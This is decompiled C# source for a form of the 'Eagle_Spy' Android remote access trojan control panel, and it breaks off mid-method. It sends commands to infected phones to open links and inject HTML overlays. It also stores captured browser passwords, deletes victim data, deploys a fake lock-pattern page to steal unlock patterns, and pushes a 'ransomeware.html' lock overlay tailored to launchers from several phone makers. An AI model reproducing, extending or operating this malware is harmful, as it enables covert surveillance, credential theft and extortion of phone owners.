using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Sipaa.Framework;
using Siticone.Desktop.UI.WinForms;

namespace Eagle_Spy
{
	// Token: 0x020000AD RID: 173
	[DesignerGenerated]
	public partial class WebViewMonitor : Form
	{
		// Token: 0x06000914 RID: 2324 RVA: 0x000051A7 File Offset: 0x000033A7
		private void DrakeUITextBox1_MouseDown(object sender, MouseEventArgs e)
		{
			if (Conversions.ToBoolean(this.firstclick))
			{
				this.firstclick = false;
				this.TargetLink.Text = "";
			}
		}

		// Token: 0x06000915 RID: 2325 RVA: 0x000E3980 File Offset: 0x000E1B80
		public WebViewMonitor()
		{
			base.Load += this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry;
			base.FormClosing += this.WebViewMonitor_FormClosing;
			this.Title = "null";
			this.firstclick = true;
			this.MapData = new Dictionary<string, string>();
			this.y = 0;
			this.InitializeComponent();
		}

		// Token: 0x06000916 RID: 2326 RVA: 0x000E39E8 File Offset: 0x000E1BE8
		public void PostData(string datastring)
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				this.datalogtext.AppendText("> " + datastring + "\r\n");
			}));
		}

		// Token: 0x06000917 RID: 2327 RVA: 0x000E3A1C File Offset: 0x000E1C1C
		public void addlinks(string lnk)
		{
			base.Invoke(new VB_0024AnonymousDelegate_0(delegate
			{
				Label label = new Label();
				label.Cursor = Cursors.Hand;
				label.Dock = DockStyle.Top;
				label.Font = new Font("Calibri", 14f);
				label.ForeColor = Color.Aqua;
				label.Size = new Size(631, 40);
				label.TabIndex = 0;
				label.Text = lnk;
				label.TextAlign = ContentAlignment.MiddleCenter;
				label.MouseClick += delegate
				{
					try
					{
						if (this.Classclient != null)
						{
							try
							{
								string[] array = this.Classclient.Keys.Split(new char[] { ':' });
								object[] array2 = new object[]
								{
									this.Classclient.myClient,
									string.Concat(new string[]
									{
										SecurityKey.KeysClient2,
										Data.SPL_SOCKET,
										"lodp<*>g<*>",
										label.Text,
										Data.SPL_SOCKET,
										array[0],
										Data.SPL_SOCKET,
										array[1],
										Data.SPL_SOCKET,
										SecurityKey.Lockscreen,
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Conversions.ToString(0),
										Data.SPL_SOCKET,
										Data.SPL_ARRAY,
										Data.SPL_SOCKET,
										this.Classclient.ClientRemoteAddress
									}),
									Codes.Encoding().GetBytes("null"),
									this.Classclient
								};
								this.Classclient.SendMessage(array2);
							}
							catch (Exception)
							{
							}
						}
					}
					catch (Exception)
					{
					}
				};
				this.linkspanel.Controls.Add(label);
			}));
		}

		// Token: 0x06000918 RID: 2328 RVA: 0x000E3A50 File Offset: 0x000E1C50
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx(object sender, EventArgs e)
		{
			if (this.Classclient == null)
			{
				return;
			}
			if (!string.IsNullOrEmpty(this.TargetLink.Text) && !string.IsNullOrEmpty(this.TargetLink.Text))
			{
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				int num = 0;
				int num2 = 0;
				string text = "";
				if (Operators.CompareString(this.DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), false) == 0)
				{
					this.statustext.Text = "Request Sent";
				}
				else
				{
					text = "mon<*>";
					this.statustext.Text = "Starting Monitoring , Please Wait...";
				}
				object[] array2 = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lnk<*>",
						text,
						reso.ChekLink(this.TargetLink.Text),
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(num),
						Data.SPL_SOCKET,
						Conversions.ToString(num2),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
				return;
			}
			EagleAlert.ShowWarning("Enter Link First !!!");
		}

		// Token: 0x06000919 RID: 2329 RVA: 0x000E3C08 File Offset: 0x000E1E08
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsokqautry(object sender, EventArgs e)
		{
			this.DrakeUIComboBox1.Text = "just open";
			try
			{
				this.ClientPic.Image = this.Classclient.Wallpaper;
				this.clinameinfo.Text = string.Concat(new string[]
				{
					"Name: ",
					this.Classclient.ClientName,
					Strings.Space(2),
					"IP: ",
					this.Classclient.ClientAddressIP,
					Strings.Space(2),
					"Country: ",
					this.Classclient.Country
				});
			}
			catch (Exception)
			{
			}
			this.translateme();
			try
			{
				if (!Directory.Exists(this.Classclient.FolderUSER + "\\Browser_CAP"))
				{
					Directory.CreateDirectory(this.Classclient.FolderUSER + "\\Browser_CAP");
				}
			}
			catch (Exception)
			{
			}
			this.BWloader.RunWorkerAsync();
		}

		// Token: 0x0600091A RID: 2330 RVA: 0x000E3D14 File Offset: 0x000E1F14
		private void translateme()
		{
			string language = RegistryHandler.Get_Language();
			if (Operators.CompareString(language, "CN", false) != 0)
			{
				if (Operators.CompareString(language, "AR", false) == 0)
				{
					this.Mytitle.Text = Codes.Translate(this.Mytitle.Text, "en", "ar");
					this.openbtn.Text = Codes.Translate(this.openbtn.Text, "en", "ar");
					this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "ar");
					this.clrbtn.Text = Codes.Translate(this.clrbtn.Text, "en", "ar");
					this.savbtn.Text = Codes.Translate(this.savbtn.Text, "en", "ar");
					this.cpybtn.Text = Codes.Translate(this.cpybtn.Text, "en", "ar");
					this.refbtn.Text = Codes.Translate(this.refbtn.Text, "en", "ar");
					this.commndbtn.Text = Codes.Translate(this.commndbtn.Text, "en", "ar");
					this.linkspanel.Text = Codes.Translate(this.selecthtmlbtn.Text, "en", "ar");
					this.datapanel.Text = Codes.Translate(this.datapanel.Text, "en", "ar");
					this.selecthtmlbtn.Text = Codes.Translate(this.selecthtmlbtn.Text, "en", "ar");
					this.tabcontrols.TabPages[0].Text = Codes.Translate(this.tabcontrols.TabPages[0].Text, "en", "ar");
					this.tabcontrols.TabPages[1].Text = Codes.Translate(this.tabcontrols.TabPages[1].Text, "en", "ar");
					this.tabcontrols.TabPages[2].Text = Codes.Translate(this.tabcontrols.TabPages[2].Text, "en", "ar");
					return;
				}
			}
			else
			{
				this.Mytitle.Text = Codes.Translate(this.Mytitle.Text, "en", "zh");
				this.openbtn.Text = Codes.Translate(this.openbtn.Text, "en", "zh");
				this.Label2.Text = Codes.Translate(this.Label2.Text, "en", "zh");
				this.clrbtn.Text = Codes.Translate(this.clrbtn.Text, "en", "zh");
				this.savbtn.Text = Codes.Translate(this.savbtn.Text, "en", "zh");
				this.cpybtn.Text = Codes.Translate(this.cpybtn.Text, "en", "zh");
				this.refbtn.Text = Codes.Translate(this.refbtn.Text, "en", "zh");
				this.commndbtn.Text = Codes.Translate(this.commndbtn.Text, "en", "zh");
				this.selecthtmlbtn.Text = Codes.Translate(this.selecthtmlbtn.Text, "en", "zh");
				this.linkspanel.Text = Codes.Translate(this.linkspanel.Text, "en", "zh");
				this.datapanel.Text = Codes.Translate(this.datapanel.Text, "en", "zh");
				this.tabcontrols.TabPages[0].Text = Codes.Translate(this.tabcontrols.TabPages[0].Text, "en", "zh");
				this.tabcontrols.TabPages[1].Text = Codes.Translate(this.tabcontrols.TabPages[1].Text, "en", "zh");
				this.tabcontrols.TabPages[2].Text = Codes.Translate(this.tabcontrols.TabPages[2].Text, "en", "zh");
			}
		}

		// Token: 0x0600091B RID: 2331 RVA: 0x000E41DC File Offset: 0x000E23DC
		private void Vsbar_ValueChanged(object sender, EventArgs e)
		{
			try
			{
				if (this.vewimage.Image != null)
				{
					this.y = (sender as DrakeUIScrollBar).Value;
					this.vewimage.Refresh();
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600091C RID: 2332 RVA: 0x00002423 File Offset: 0x00000623
		private void Vewimage_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600091D RID: 2333 RVA: 0x000E4228 File Offset: 0x000E2428
		private void BWloader_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				if (this.Classclient != null)
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>l<*>",
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600091E RID: 2334 RVA: 0x000E435C File Offset: 0x000E255C
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys(object sender, EventArgs e)
		{
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.InitialDirectory = "C:\\";
				openFileDialog.Title = "Selecte HTML Files (.html)";
				openFileDialog.Filter = "html Files|*.html";
				DialogResult dialogResult = openFileDialog.ShowDialog();
				if (dialogResult == DialogResult.OK)
				{
					string fileName = openFileDialog.FileName;
					DialogResult dialogResult2 = MessageBox.Show("Send This View ?", "Confirm", MessageBoxButtons.YesNo);
					if (dialogResult2 == DialogResult.Yes)
					{
						TcpClient myClient = this.Classclient.myClient;
						string[] array = this.Classclient.Keys.Split(new char[] { ':' });
						string text = Conversions.ToString(Codes.BSEN(File.ReadAllText(fileName)));
						object[] array2 = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"ussd<*>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.Classclient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.Classclient
						};
						this.Classclient.SendMessage(array2);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600091F RID: 2335 RVA: 0x000E44FC File Offset: 0x000E26FC
		private void WebViewMonitor_FormClosing(object sender, FormClosingEventArgs e)
		{
			if (this.Classclient != null)
			{
				string[] array = this.Classclient.Keys.Split(new char[] { ':' });
				int num = 0;
				int num2 = 0;
				if (Operators.CompareString(this.DrakeUIComboBox1.Text.ToLower(), "just open".ToLower(), false) == 0)
				{
					this.statustext.Text = "Request Sent";
				}
				else
				{
					this.statustext.Text = "Starting Monitoring , Please Wait...";
				}
				object[] array2 = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"bORlQeywIwrkkxg8BnzKHg==STP",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(num),
						Data.SPL_SOCKET,
						Conversions.ToString(num2),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array2);
			}
			this.BWloader.Dispose();
		}

		// Token: 0x06000920 RID: 2336 RVA: 0x00002423 File Offset: 0x00000623
		private void Timeloader_Tick(object sender, EventArgs e)
		{
		}

		// Token: 0x06000921 RID: 2337 RVA: 0x000E4664 File Offset: 0x000E2864
		private void Namescombo_SelectedIndexChanged(object sender, EventArgs e)
		{
			try
			{
				if (!string.IsNullOrEmpty(this.namescombo.Text))
				{
					string text = this.MapData[this.namescombo.Text];
					if (text != null && text.Contains(":"))
					{
						string[] array = text.Split(new char[] { ':' });
						string text2 = this.namescombo.Text;
						string text3 = array[0];
						string text4 = array[1];
						this.nametext.Text = text2;
						this.linktext.Text = text3;
						this.idtext.Text = text4;
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000922 RID: 2338 RVA: 0x000051D2 File Offset: 0x000033D2
		private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
		{
			if (!this.BWloader.IsBusy)
			{
				this.BWloader.RunWorkerAsync();
			}
		}

		// Token: 0x06000923 RID: 2339 RVA: 0x000051EC File Offset: 0x000033EC
		private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			this.datalogtext.Text = "";
		}

		// Token: 0x06000924 RID: 2340 RVA: 0x000051FE File Offset: 0x000033FE
		private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrEmpty(this.datalogtext.Text))
			{
				Clipboard.SetText(this.datalogtext.Text);
				EagleAlert.ShowSucess("Text Copied.");
			}
		}

		// Token: 0x06000925 RID: 2341 RVA: 0x000E470C File Offset: 0x000E290C
		private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
		{
			if (!Directory.Exists(this.Classclient.FolderUSER + "\\Browser_CAP\\Passwords"))
			{
				EagleAlert.Showinformation("No Password Founded");
				return;
			}
			Process.Start(this.Classclient.FolderUSER + "\\Browser_CAP\\Passwords");
		}

		// Token: 0x06000926 RID: 2342 RVA: 0x000E475C File Offset: 0x000E295C
		private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
		{
			string text = this.comandcombo.Text.ToLower();
			if (!(text == "add"))
			{
				if (!(text == "remove"))
				{
					if (!(text == "edit"))
					{
						if (!(text == "clean"))
						{
							return;
						}
						if (string.IsNullOrEmpty(this.namescombo.Text))
						{
							EagleAlert.ShowWarning("Select name to remove.");
							return;
						}
						if (Codes.MyMsgBox("Alert", "Are you sure you want to Clean Data For:\r\n" + this.namescombo.Text + " data will be removed from phone.", true, Resources.information48px))
						{
							string text2 = this.namescombo.Text;
							string[] array = this.Classclient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.Classclient.myClient,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient2,
									Data.SPL_SOCKET,
									"lodp<*>cl<*>",
									text2,
									Data.SPL_SOCKET,
									array[0],
									Data.SPL_SOCKET,
									array[1],
									Data.SPL_SOCKET,
									SecurityKey.Lockscreen,
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Conversions.ToString(0),
									Data.SPL_SOCKET,
									Data.SPL_ARRAY,
									Data.SPL_SOCKET,
									this.Classclient.ClientRemoteAddress
								}),
								Codes.Encoding().GetBytes("null"),
								this.Classclient
							};
							this.Classclient.SendMessage(array2);
							return;
						}
						return;
					}
					else
					{
						if (string.IsNullOrEmpty(this.namescombo.Text))
						{
							EagleAlert.ShowWarning("Select name to Edit.");
							return;
						}
						string text3 = this.nametext.Text;
						string text4 = this.linktext.Text;
						string text5 = "blank";
						if (!string.IsNullOrEmpty(this.idtext.Text))
						{
							text5 = this.idtext.Text;
						}
						string text6 = string.Concat(new string[] { text3, ">", text4, ">", text5, ">" });
						string[] array3 = this.Classclient.Keys.Split(new char[] { ':' });
						object[] array4 = new object[]
						{
							this.Classclient.myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"lodp<*>ed<*>",
								text6,
								Data.SPL_SOCKET,
								array3[0],
								Data.SPL_SOCKET,
								array3[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.Classclient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.Classclient
						};
						this.Classclient.SendMessage(array4);
						return;
					}
				}
			}
			else
			{
				if (string.IsNullOrEmpty(this.nametext.Text) | string.IsNullOrEmpty(this.linktext.Text))
				{
					EagleAlert.ShowWarning("Both (Name , Link) is required.");
					return;
				}
				if (this.comandcombo.Items.Contains(this.nametext.Text))
				{
					EagleAlert.ShowWarning("this name already add.");
					return;
				}
				string text7 = this.nametext.Text;
				string text8 = this.linktext.Text;
				string text9 = "blank";
				if (!string.IsNullOrEmpty(this.idtext.Text))
				{
					text9 = this.idtext.Text;
				}
				string text10 = string.Concat(new string[] { text7, ">", text8, ">", text9, ">" });
				if (this.Classclient == null)
				{
					return;
				}
				try
				{
					string[] array5 = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array6 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text10,
							Data.SPL_SOCKET,
							array5[0],
							Data.SPL_SOCKET,
							array5[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array6);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			if (string.IsNullOrEmpty(this.namescombo.Text))
			{
				EagleAlert.ShowWarning("Select name to remove.");
				return;
			}
			if (Codes.MyMsgBox("Alert", "Are you sure you want to remove\r\n" + this.namescombo.Text + " from monitoring list ?", true, Resources.information48px))
			{
				string text11 = this.namescombo.Text;
				string[] array7 = this.Classclient.Keys.Split(new char[] { ':' });
				object[] array8 = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"lodp<*>re<*>",
						text11,
						Data.SPL_SOCKET,
						array7[0],
						Data.SPL_SOCKET,
						array7[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array8);
				return;
			}
		}

		// Token: 0x06000927 RID: 2343 RVA: 0x000051D2 File Offset: 0x000033D2
		private void drakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (!this.BWloader.IsBusy)
			{
				this.BWloader.RunWorkerAsync();
			}
		}

		// Token: 0x06000928 RID: 2344 RVA: 0x000E4E0C File Offset: 0x000E300C
		private void drakeUIButtonIcon5_Click_1(object sender, EventArgs e)
		{
			this.Replacelockpattern();
			string text = "pattern>http://" + this.label11.Text + "/lock/pattern.html>com.android.settings>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
					this.OpenSettings();
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000929 RID: 2345 RVA: 0x000E4F6C File Offset: 0x000E316C
		private void OpenSettings()
		{
			string text = "com.android.settings";
			if (this.Classclient != null)
			{
				object[] array = new object[]
				{
					this.Classclient.myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".apps",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"open",
						Data.SPL_DATA,
						text
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(array);
			}
		}

		// Token: 0x0600092A RID: 2346 RVA: 0x000E5034 File Offset: 0x000E3234
		private void samsung()
		{
			string text = "samsung>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.sec.android.app.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600092B RID: 2347 RVA: 0x000E5188 File Offset: 0x000E3388
		private void redmi()
		{
			string text = "redmi>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.miui.home>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600092C RID: 2348 RVA: 0x000E52DC File Offset: 0x000E34DC
		private void realme()
		{
			string text = "realme>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.android.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600092D RID: 2349 RVA: 0x000E5430 File Offset: 0x000E3630
		private void oppo()
		{
			string text = "oppo>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.oppo.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600092E RID: 2350 RVA: 0x000E5584 File Offset: 0x000E3784
		private void vivo()
		{
			string text = "vivo>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.bbk.launcher2>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600092F RID: 2351 RVA: 0x000E56D8 File Offset: 0x000E38D8
		private void pixel()
		{
			string text = "pixel>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.google.android.apps.nexuslauncher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000930 RID: 2352 RVA: 0x000E582C File Offset: 0x000E3A2C
		private void motorola()
		{
			string text = "motorola>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.motorola.launcher3>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000931 RID: 2353 RVA: 0x000E5980 File Offset: 0x000E3B80
		private void huawei()
		{
			string text = "huawei>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.huawei.android.launcher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
						string.Concat(new string[]
						{
							SecurityKey.KeysClient2,
							Data.SPL_SOCKET,
							"lodp<*>ad<*>",
							text,
							Data.SPL_SOCKET,
							array[0],
							Data.SPL_SOCKET,
							array[1],
							Data.SPL_SOCKET,
							SecurityKey.Lockscreen,
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Conversions.ToString(0),
							Data.SPL_SOCKET,
							Data.SPL_ARRAY,
							Data.SPL_SOCKET,
							this.Classclient.ClientRemoteAddress
						}),
						Codes.Encoding().GetBytes("null"),
						this.Classclient
					};
					this.Classclient.SendMessage(array2);
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x06000932 RID: 2354 RVA: 0x000E5AD4 File Offset: 0x000E3CD4
		private void poco()
		{
			string text = "poco>http://" + this.label11.Text + "/ransomeware/ransomeware.html>com.mi.android.globallauncher>";
			if (this.Classclient != null)
			{
				try
				{
					string[] array = this.Classclient.Keys.Split(new char[] { ':' });
					object[] array2 = new object[]
					{
						this.Classclient.myClient,
